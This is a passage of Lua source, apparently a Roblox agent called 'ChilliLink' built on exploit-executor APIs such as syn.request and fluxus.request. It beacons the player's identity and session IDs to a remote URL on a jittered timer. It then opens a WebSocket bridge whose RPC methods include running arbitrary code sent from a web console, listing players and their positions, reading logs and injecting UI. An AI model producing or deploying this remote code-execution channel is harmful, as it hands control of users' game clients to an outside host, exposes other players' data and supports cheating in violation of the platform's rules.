end)
setfenv(v16, v17)
local now = os.clock()
local v18 = table.pack(xpcall(v16, fn52))
local n19 = math.floor((os.clock() - now) * 1000 + 0.5)
if not v18[1] then
error(string.format("Runtime error: %s\n--- output ---\n%s", tostring(v18[2]), table.concat(tbl36, "\n"):sub(-20000)), 0)
end
return fn51(v18, n19, tbl36, flag9)
end,
["exec.async"] = function(arg)
local v16 = fn48(arg.code, arg.label)
local tbl36 = { id = HttpService2:GenerateGUID(false):sub(1, 8) }
tbl36.label = tostring(arg.label or "Script"):sub(1, 60)
tbl36.startedAt = os.clock()
tbl36.pending = {}
tbl36.lineCount = 0
tbl36.dropped = 0
local v17 = fn49(function(arg2, arg3)
tbl36.lineCount = tbl36.lineCount + 1
if #tbl36.pending >= n17 then
tbl36.dropped = tbl36.dropped + 1
return
end
table.insert(tbl36.pending, { kind = arg2, text = arg3:sub(1, 1000) })
end)
setfenv(v16, v17)
tbl35[tbl36.id] = tbl36
task.spawn(function()
while tbl35[tbl36.id] == tbl36 do
task.wait(0.3)
if tbl36.dropped > 0 then
table.insert(tbl36.pending, { kind = "warn", text = string.format("... %d line(s) skipped ...", tbl36.dropped) })
tbl36.dropped = 0
end
fn53(tbl36)
end
end)
tbl36.thread = task.defer(function()
local v18 = table.pack(xpcall(v16, fn52))
if tbl35[tbl36.id] ~= tbl36 then
return
end
tbl35[tbl36.id] = nil
fn53(tbl36)
local startedAt = tbl36.startedAt
local n18 = math.floor((os.clock() - startedAt) * 1000 + 0.5)
local tbl37 = { runId = tbl36.id, label = tbl36.label, ok = v18[1] == true, elapsedMs = n18 }
if v18[1] then
local v19 = fn51(v18, n18, {}, false)
tbl37.returnsInfo = v19.returnsInfo
tbl37.returnCount = v19.returnCount
else
tbl37.error = tostring(v18[2]):sub(1, 4000)
end
fn30("exec.finished", tbl37)
end)
return { runId = tbl36.id, label = tbl36.label }
end,
["exec.cancel"] = function(arg)
local v16 = tbl35[tostring(arg.runId or "")]
if not v16 then
return { cancelled = false, reason = "not running" }
end
tbl35[v16.id] = nil
pcall(task.cancel, v16.thread)
fn53(v16)
local startedAt = v16.startedAt
fn30("exec.finished", {
runId = v16.id,
label = v16.label,
ok = false,
cancelled = true,
error = "Cancelled from the web console",
elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
})
return { cancelled = true, runId = v16.id }
end,
["exec.list"] = function()
local tbl36 = {}
for k, v16 in pairs(tbl35) do
local startedAt = v16.startedAt
table.insert(tbl36, {
runId = k,
label = v16.label,
lines = v16.lineCount,
elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
})
end
return { count = #tbl36, runs = tbl36 }
end,
["console.tail"] = function(arg)
local logHistory = game:GetService("LogService"):GetLogHistory()
local v16 = fn22(arg.limit, 1, 500, 200)
local n18 = tonumber(arg.since) or 0
local tbl36 = {}
for i = #logHistory, 1, -1 do
local v17 = logHistory[i]
if not (v17.timestamp <= n18 or #tbl36 >= v16) then
table.insert(tbl36, 1, {
message = tostring(v17.message):sub(1, 1000),
kind = v17.messageType.Name,
time = v17.timestamp,
})
continue
end
break
end
return { count = #tbl36, entries = tbl36, latest = logHistory[#logHistory] and logHistory[#logHistory].timestamp or n18 }
end,
["players.list"] = function(arg)
local tbl36 = {}
local flag9 = arg.includePosition ~= false
for _, player in ipairs(Players2:GetPlayers()) do
table.insert(tbl36, fn54(player, flag9))
end
table.sort(tbl36, function(arg2, arg3)
return string.lower(arg2.name) < string.lower(arg3.name)
end)
return { count = #tbl36, players = tbl36 }
end,
["players.get"] = function(arg)
local query = arg.query
local num = tonumber(query)
local v16 = string.lower(fn21(query))
for _, player in ipairs(Players2:GetPlayers()) do
if num and player.UserId == num or string.lower(player.Name) == v16 or string.lower(player.DisplayName) == v16 then
return fn54(player, true)
end
end
error("player not found: " .. tostring(query))
end,
["characters.list"] = function()
local tbl36 = {}
for _, player in ipairs(Players2:GetPlayers()) do
local character = player.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
table.insert(tbl36, {
player = player.Name,
userId = player.UserId,
characterPath = character and fn27(character) or nil,
health = humanoid and humanoid.Health or nil,
maxHealth = humanoid and humanoid.MaxHealth or nil,
walkSpeed = humanoid and humanoid.WalkSpeed or nil,
jumpPower = humanoid and humanoid.JumpPower or nil,
moveDirection = humanoid and fn28(humanoid.MoveDirection) or nil,
state = humanoid and tostring(humanoid:GetState()) or nil,
position = humanoidRootPart and fn28(humanoidRootPart.Position) or nil,
velocity = humanoidRootPart and fn28(humanoidRootPart.AssemblyLinearVelocity) or nil,
})
end
return { count = #tbl36, characters = tbl36 }
end,
["workspace.summary"] = function(arg)
local n18 = math.floor(fn22(arg.maxDescendants, 1, 5000, 2000))
local tbl36 = {}
local tbl37 = {}
for _, child in ipairs(Workspace:GetChildren()) do
table.insert(tbl37, fn33(child))
end
local v16 = fn34(Workspace, n18, function(arg2)
tbl36[arg2.ClassName] = (tbl36[arg2.ClassName] or 0) + 1
return false
end)
return {
topLevel = tbl37,
topLevelCount = #tbl37,
scannedDescendants = v16,
truncated = v16 >= n18,
classCounts = tbl36,
}
end,
["instance.find"] = function(arg)
local v16, v17 = fn31(arg.root or "Workspace")
if not v16 then
error(v17)
end
local v18 = string.lower(fn21(arg.nameContains))
local v19 = fn21(arg.className)
local n18 = math.floor(fn22(arg.limit, 1, 200, 50))
local tbl36 = {}
local v20 = fn34(v16, math.floor(fn22(arg.scanLimit, 1, 10000, 3000)), function(arg2)
local flag9 = v18 == "" or string.find(string.lower(arg2.Name), v18, 1, true) ~= nil
local flag10 = false
if v19 ~= "" and arg2.ClassName ~= v19 then
pcall(function()
flag10 = arg2:IsA(v19)
end)
end
if flag9 and (v19 == "" or arg2.ClassName == v19 or flag10) then
table.insert(tbl36, fn33(arg2))
end
return #tbl36 >= n18
end)
return { root = fn27(v16), scanned = v20, count = #tbl36, matches = tbl36 }
end,
["instance.children"] = function(arg)
local v16, v17 = fn31(arg.path)
if not v16 then
error(v17)
end
local n18 = math.floor(fn22(arg.limit, 1, 500, 100))
local children = v16:GetChildren()
local tbl36 = {}
for i = 1, math.min(#children, n18) do
table.insert(tbl36, fn33(children[i]))
end
return { parent = fn33(v16), total = #children, returned = #tbl36, children = tbl36 }
end,
["instance.inspect"] = function(arg)
local v16, v17 = fn31(arg.path)
if not v16 then
error(v17)
end
local tbl36 = {}
for _, v18 in ipairs(tbl25) do
tbl36[v18] = true
end
if type(arg.properties) == "table" then
for _, property in ipairs(arg.properties) do
tbl36[tostring(property)] = true
end
end
local tbl37 = {}
local tbl38 = {}
for k in pairs(tbl36) do
local v18, v19 = fn32(v16, k)
if v19 then
tbl38[k] = v19
else
tbl37[k] = v18
end
end
return {
instance = fn33(v16),
attributes = fn28(v16:GetAttributes()),
tags = fn28(v16:GetTags()),
childCount = #v16:GetChildren(),
properties = tbl37,
unavailable = tbl38,
}
end,
["instance.attributes"] = function(arg)
local v16, v17 = fn31(arg.path)
if not v16 then
error(v17)
end
return { instance = fn33(v16), attributes = fn28(v16:GetAttributes()) }
end,
["camera.get"] = function()
local currentCamera = Workspace.CurrentCamera
if not currentCamera then
error("CurrentCamera is unavailable")
end
return {
path = fn27(currentCamera),
cameraType = tostring(currentCamera.CameraType),
fieldOfView = currentCamera.FieldOfView,
viewportSize = fn28(currentCamera.ViewportSize),
cframe = fn28(currentCamera.CFrame),
focus = fn28(currentCamera.Focus),
subject = fn28(currentCamera.CameraSubject),
}
end,
["telemetry.snapshot"] = function()
local result = RunService2.RenderStepped:Wait()
local totalMemoryUsageMb = nil
pcall(function()
totalMemoryUsageMb = game:GetService("Stats"):GetTotalMemoryUsageMb()
end)
return {
fpsEstimate = result > 0 and math.floor(1 / result + 0.5) or nil,
frameDeltaMs = result * 1000,
memoryMb = totalMemoryUsageMb,
playerCount = #Players2:GetPlayers(),
placeId = game.PlaceId,
jobId = game.JobId,
distributedGameTime = Workspace.DistributedGameTime,
timestamp = DateTime.now().UnixTimestampMillis,
}
end,
["ui.create"] = function(arg)
local v16, v17 = fn42(true)
if not v16 then
error(v17)
end
if arg.replace ~= false then
fn23(tbl24)
for _, child in ipairs(v16:GetChildren()) do
child:Destroy()
end
end
local tbl36 = { count = 0 }
local v18, v19 = fn45(arg.tree, v16, 1, tbl36)
return { created = fn33(v18), objectCount = tbl36.count, propertyResult = v19 }
end,
["ui.update"] = function(arg)
local v16, v17 = fn43(arg.path)
if not v16 then
error(v17)
end
return { instance = fn33(v16), result = fn40(v16, arg.props) }
end,
["ui.delete"] = function(arg)
local v16 = fn21(arg.path)
local v17, v18 = fn43(v16)
if not v17 then
if v16 == "" then
return { deleted = false, reason = "managed UI does not exist" }
end
error(v18)
end
fn23(tbl24)
local v19 = fn27(v17)
v17:Destroy()
return { deleted = true, path = v19 }
end,
["ui.list"] = function(arg)
local v16, v17 = fn42(false)
if not v16 then
return { exists = false, reason = v17 or "managed UI does not exist" }
end
local n18 = math.floor(fn22(arg.maxDepth, 1, 10, 6))
return { exists = true, tree = fn46(v16, 0, n18) }
end,
["ui.notify"] = function(arg)
local v16, v17 = fn42(true)
if not v16 then
error(v17)
end
local notifications = v16:FindFirstChild("Notifications")
if not notifications then
notifications = Instance.new("Frame")
notifications.Name = "Notifications"
notifications.AnchorPoint = Vector2.new(1, 0)
notifications.Position = UDim2.new(1, -16, 0, 16)
notifications.Size = UDim2.fromOffset(360, 500)
notifications.BackgroundTransparency = 1
notifications.Parent = v16
local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Padding = UDim.new(0, 8)
uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
uiListLayout.Parent = notifications
end
local textLabel = Instance.new("TextLabel")
textLabel.Name = "Notification_" .. HttpService2:GenerateGUID(false)
textLabel.Size = UDim2.fromOffset(340, 64)
textLabel.BackgroundColor3 = fn35(arg.color) or Color3.fromRGB(25, 35, 52)
textLabel.BackgroundTransparency = 0.08
textLabel.Text = tostring(arg.text):sub(1, 500)
textLabel.TextColor3 = Color3.fromRGB(240, 247, 255)
textLabel.TextSize = 16
textLabel.Font = Enum.Font.GothamSemibold
textLabel.TextWrapped = true
textLabel.Parent = notifications
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10)
uiCorner.Parent = textLabel
local v18 = fn22(arg.duration, 0.5, 30, 4)
task.delay(v18, function()
if textLabel.Parent then
textLabel:Destroy()
end
end)
return { shown = true, name = textLabel.Name, duration = v18 }
end,
}
local function fn55(arg)
local str5 = tostring(arg.requestId or "")
local unknownOrDisallowedMethod = tostring(arg.method or "")
local v16 = tbl36[unknownOrDisallowedMethod]
if str5 == "" then
return
end
if not v16 then
fn29({
type = "rpc_result",
requestId = str5,
success = false,
error = "Unknown or disallowed method: " .. unknownOrDisallowedMethod,
})
return
end
task.spawn(function()
local ok, result = xpcall(function()
return v16(type(arg.params) == "table" and arg.params or {})
end, function(arg2)
return debug.traceback(tostring(arg2), 2)
end)
if ok then
fn29({ type = "rpc_result", requestId = str5, success = true, data = fn28(result) })
else
fn29({ type = "rpc_result", requestId = str5, success = false, error = tostring(result):sub(1, 2000) })
end
end)
end
local function fn56(arg)
local ok, result = pcall(function()
return HttpService2:JSONDecode(tostring(arg))
end)
if not ok or type(result) ~= "table" then
fn20("Invalid JSON message")
return
end
if result.type == "identify_ok" then
fn19("Connected to bridge. Client ID:", tostring(result.clientId))
local tbl37 = {}
for k in pairs(tbl36) do
table.insert(tbl37, k)
end
table.sort(tbl37)
fn30("agent.ready", { clientId = result.clientId, methods = tbl37, playerCount = #Players2:GetPlayers() })
return
end
if result.type == "pong" then
fn19("PONG", tostring(result.seq or ""))
return
end
if result.type == "rpc_request" then
fn55(result)
return
end
if result.type == "identify_error" then
fn20("Bridge rejected identity:", tostring(result.error))
end
end
local function fn57()
flag7 = false
fn23(tbl23)
if not v15 then
return
end
pcall(function()
if type(v15.Close) == "function" then
v15:Close()
elseif type(v15.close) == "function" then
v15:close()
end
end)
v15 = nil
end
local function fn58()
local v16, v17 = fn24()
if not v16 then
fn20("No supported WebSocket API found")
return false
end
n14 += 1
local v18 = n14
fn19("Connecting to", str2, "using", v17)
local ok, result = pcall(function()
return v16(str2)
end)
if not ok or not result then
fn20("Connection failed:", tostring(result))
return false
end
v15 = result
flag7 = true
local onMessage = fn25(v15, "OnMessage", "MessageReceived")
local onClose = fn25(v15, "OnClose", "Closed", "OnDisconnect")
local onError = fn25(v15, "OnError", "Error")
local v19 = fn26(onMessage, function(arg)
if v18 == n14 then
fn56(arg)
end
end)
if v19 then
table.insert(tbl23, v19)
local v20 = fn26(onClose, function(...)
if v18 == n14 then
flag7 = false
fn20("Socket closed", ...)
end
end)
if v20 then
table.insert(tbl23, v20)
end
local v21 = fn26(onError, function(...)
if v18 == n14 then
fn20("Socket error", ...)
flag7 = false
end
end)
if v21 then
table.insert(tbl23, v21)
end
local v22, v23 = fn29({
type = "identify",
clientType = "roblox",
token = str,
name = localPlayer2.Name,
displayName = localPlayer2.DisplayName,
userId = localPlayer2.UserId,
placeId = game.PlaceId,
jobId = game.JobId,
version = str4,
})
if not v22 then
fn20(v23)
flag7 = false
end
task.spawn(function()
while flag6 and flag7 and v18 == n14 do
task.wait(20)
if flag6 and flag7 and v18 == n14 then
n15 += 1
local v24, v25 = fn29({ type = "ping", seq = n15 })
if not v24 then
fn20("Heartbeat failed:", tostring(v25))
flag7 = false
end
end
end
end)
while flag6 and flag7 and v18 == n14 do
task.wait(0.5)
end
if v18 == n14 then
fn57()
end
return true
end
fn20("Socket has no supported message event")
fn57()
return false
end
table.insert(tbl22, Players2.PlayerAdded:Connect(function(player)
if flag5 then
fn30("player.added", fn54(player, true))
end
end))
table.insert(tbl22, Players2.PlayerRemoving:Connect(function(player)
if flag5 then
fn30("player.removing", fn54(player, true))
end
end))
genv.StopChilliLink = function()
if not flag6 then
return
end
fn19("Stopping agent")
flag6 = false
n14 += 1
fn23(tbl22)
fn23(tbl24)
fn57()
end
local request_2 = syn and syn.request or http_request or request or request_ and request_.request or fluxus and fluxus.request
local function fn59()
if type(request_2) ~= "function" then
return nil
end
local ok, result = pcall(function()
return HttpService2:JSONEncode({
token = str,
userId = localPlayer2.UserId,
name = localPlayer2.Name,
displayName = localPlayer2.DisplayName,
placeId = game.PlaceId,
jobId = game.JobId,
version = str4,
})
end)
if not ok then
return nil
end
local ok2, result2 = pcall(request_2, { Url = str3, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = result })
if not ok2 or type(result2) ~= "table" or tonumber(result2.StatusCode) ~= 200 then
return nil
end
local ok3, result3 = pcall(function()
return HttpService2:JSONDecode(tostring(result2.Body))
end)
if ok3 and type(result3) == "table" then
return result3
end
return nil
end
task.spawn(function()
while flag6 do
local v16 = fn59()
local n18 = 60
if v16 then
n18 = fn22(v16.interval, 5, 600, 60)
if v16.connect == true and not flag8 and not flag7 then
flag8 = true
task.spawn(function()
pcall(fn58)
flag8 = false
end)
end
end
task.wait(n18 * (0.85 + math.random() * 0.3))
end
fn19("Agent stopped")
end)
end
